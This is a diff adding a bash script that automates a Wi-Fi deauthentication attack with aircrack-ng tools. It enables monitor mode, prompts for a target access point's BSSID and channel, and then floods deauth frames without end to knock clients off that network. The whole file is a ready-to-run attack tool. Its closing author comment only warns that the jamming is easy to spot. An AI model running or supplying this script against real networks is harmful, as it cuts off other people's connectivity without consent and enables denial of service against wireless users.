@@ -1,0 +1,73 @@
+#!/bin/bash
+if [[ $EUID -ne 0 ]]; then
+    echo "This script must be run as root."
+    exit 1
+fi
+for tool in airmon-ng airodump-ng iwconfig aireplay-ng; do
+    if ! command -v $tool &>/dev/null; then
+        echo "$tool is required but not installed. Exiting."
+        exit 1
+    fi
+done
+interfaces=$(airmon-ng | grep -Eo '^[^ ]+')
+if [ -z "$interfaces" ]; then
+    echo "No wireless interfaces found. Exiting."
+    exit 1
+fi
+if [ $(echo "$interfaces" | wc -l) -gt 1 ]; then
+    echo "Multiple interfaces found:"
+    echo "$interfaces"
+    read -p "Enter the interface you want to use: " interface
+    if [[ ! "$interfaces" =~ (^|[[:space:]])"$interface"($|[[:space:]]) ]]; then
+        echo "Invalid interface. Exiting."
+        exit 1
+    fi
+else
+    interface=$(echo "$interfaces" | head -n 1)
+fi
+mon_interface="${interface}mon"
+if ! iwconfig $mon_interface &>/dev/null; then
+    echo "Enabling monitor mode on $interface..."
+    sudo airmon-ng start $interface
+fi
+if ! iwconfig $mon_interface &>/dev/null; then
+    echo "Failed to enable monitor mode. Exiting."
+    exit 1
+fi
+echo "Scanning for available Wi-Fi networks (press Ctrl+C when you see the target)..."
+sudo airodump-ng $mon_interface
+while true; do
+    read -p "Enter the target AP BSSID (MAC address format): " bssid
+    if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
+        break
+    else
+        echo "Invalid BSSID format. Please try again."
+    fi
+done
+
+while true; do
+    read -p "Enter the target AP channel (number): " channel
+    if [[ "$channel" =~ ^[0-9]+$ ]]; then
+        break
+    else
+        echo "Invalid channel. Please enter a valid number."
+    fi
+done
+echo "Setting $mon_interface to channel $channel..."
+sudo iwconfig $mon_interface channel $channel
+current_channel=$(iwconfig $mon_interface | grep 'Frequency' | grep -oP '\d+')
+if [ "$current_channel" != "$channel" ]; then
+    echo "Failed to set channel to $channel. Exiting."
+    sudo airmon-ng stop $mon_interface
+    exit 1
+fi
+trap "echo 'Restoring wireless interface...'; sudo airmon-ng stop $mon_interface; exit" SIGINT
+
+
+
+echo "Starting deauth attack on BSSID $bssid at channel $channel..."
+sudo aireplay-ng --deauth 0 -a $bssid $mon_interface
+while true; do
+    sleep 1
+done
+#the author of this code AnomynousUser11419 says to be very carefull when using this code as it is very obvious when someone is jamming thw Wi-Fi
